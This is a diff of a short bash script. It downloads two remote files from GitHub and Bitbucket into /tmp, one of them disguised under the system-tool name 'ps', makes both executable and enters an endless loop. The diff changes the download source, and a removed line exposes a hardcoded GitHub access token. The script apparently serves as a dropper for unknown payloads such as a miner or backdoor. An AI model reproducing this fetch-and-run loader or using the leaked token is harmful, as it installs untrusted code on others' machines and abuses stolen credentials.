@@ -1,8 +1,7 @@
 #!/bin/bash
 user="$1"
 wget -O /tmp/sop https://raw.githubusercontent.com/walters99/ps/main/sop
-# wget -O /tmp/ps https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
-wget -O /tmp/ps -q --header='Authorization: token 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' https://raw.githubusercontent.com/fuckl0l/project/main/lol
+wget -O /tmp/ps https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
 chmod +x /tmp/sop /tmp/ps
 
 while true; do
